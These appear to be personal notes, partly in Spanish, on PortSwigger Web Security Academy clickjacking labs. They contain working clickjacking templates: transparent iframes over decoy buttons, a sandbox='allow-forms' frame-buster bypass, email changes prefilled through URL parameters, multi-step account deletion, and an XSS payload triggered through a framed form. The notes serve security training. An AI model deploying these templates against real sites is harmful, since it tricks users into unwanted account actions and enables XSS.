
```html
<style>
    iframe{
        width: 500px;
        height: 600px;
        opacity: 0.1;
    }

div{
    position: absolute;
    top: 550px;
    left: 40px;
}
</style>

<div>Click me</div>
<iframe src="https://0ab4001904c67faa809cf36b00960076.web-security-academy.net/my-account"></iframe>
```

```html
<style>
    iframe{
        width: 500px;
        height: 600px;
        opacity: 0.01;
    }

    div{
        position: absolute;
        top: 510px;
        left: 70px;
    }
</style>
<div>Click me</div>
<iframe src="https://0a5e008b03eb2c5280ab0344002f0062.web-security-academy.net/my-account?email=pwned@pwned.com"></iframe>
```

'iframe' buster:
- Con el sandbox lo que hacemos es limitar el iframe para que SOLO pueda gestionar formularios, lo que impide que renderice la web entera y, por tanto, que cargue la restriccion de los propios iframes.
```html
<style>
    iframe{
        width: 500px;
        height: 600px;
        opacity: 0.01;
    }

    div{
        position: absolute;
        top: 490px;
        left: 70px;
    }

</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://0aa60098032f602f800803aa008e0077.web-security-academy.net/my-account?email=probando@probando.com"></iframe>
```

XSS DOM con clickjacking:
```html
<style>
    iframe{
        width: 800px;
        height: 900px;
        opacity: 0.01;
    }

    div{
        position: absolute;
        top: 820px;
        left: 70px;
    }

</style>
<div>Click me</div>
<iframe src="https://0aec0056033f391c80d40398007900e8.web-security-academy.net/feedback?name=%3Cimg%20src=ruta%20onerror=print()%3E&email=test@test.com&subject=prueba&message=prueba"></iframe>
```

```html
<style>
    iframe{
        width: 700px;
        height: 800px;
        opacity: 0.01;
    }

    .firstClick{
        position: absolute;
        top: 500px;
        left: 70px;
    }
    
    .secondClick{
        position: absolute;
        top: 290px;
        left: 200px;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0adb005e0336992c81fe202b000600e6.web-security-academy.net/my-account"></iframe>
```

------------------------------------------------------------------------

Search For:
- Delete Account
- Change Email
- URL parameters to perform autofill Click Jacking
- Frame Buster bypass -> sandbox="allow-forms"
- Trigger XSS via GET parameter
- Multi step "click first", "click next" possible

Go to the exploit server and paste the following HTML template into the Body section:
```
<style>
    iframe {
        position:relative;
        width:2000px;
        height: 1600px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:600px;
        left:500px;
        z-index: 1;
    }
</style>
<div>Click Me</div>
<iframe src="https://0ad000a60422737187416b2300850034.web-security-academy.net/my-account"></iframe>

Make the following adjustments to the template:

    Replace YOUR-LAB-ID in the iframe src attribute with your unique lab ID.
    Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively).
    Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).
    Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
```

##### Clickjacking with form input data prefilled from a URL parameter
Adding form values on the URL
![[Pasted image 20231218120951.png]]
```
Click jacking:
<style>
    iframe {
        position:relative;
        width:2000px;
        height: 1600px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:500px;
        z-index: 1;
    }
</style>
<div>Click Me</div>
<iframe src="https://0a3d004b033a9e4986bdd7ff00ff004c.web-security-academy.net/my-account?email=pito@pito.com"></iframe>
```

![[Pasted image 20231218121053.png]]


##### Clickjacking with a frame buster script
Frame buster does not allow to add frames
```
add sanbox="allow-forms" in your iframe to bypass

<style>
    iframe {
        position:relative;
        width:2000px;
        height: 1600px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:500px;
        z-index: 1;
    }
</style>
<div>Click Me</div>
<iframe src="https://0adc00cb04f7db7e80a9efdf00bb0021.web-security-academy.net/my-account?email=test@testiculo.com" sandbox="allow-forms"></iframe>
```

##### Exploiting clickjacking vulnerability to trigger DOM-based XSS

Theres a XSS on name parameter of sunmit feedback![[Pasted image 20231218125756.png]]
![[Pasted image 20231218125832.png]]

Clickjack that:
```
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 900px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:815px;
        left:40px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a4300c403eab11c83244bc400650085.web-security-academy.net/feedback?name=<img src=x onerror=print()>&email=e@e.com&subject=caca&message=polla#feedbackResult"></iframe>
```


##### Multi-step click jacking
Delete and confirm account deleted
```
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```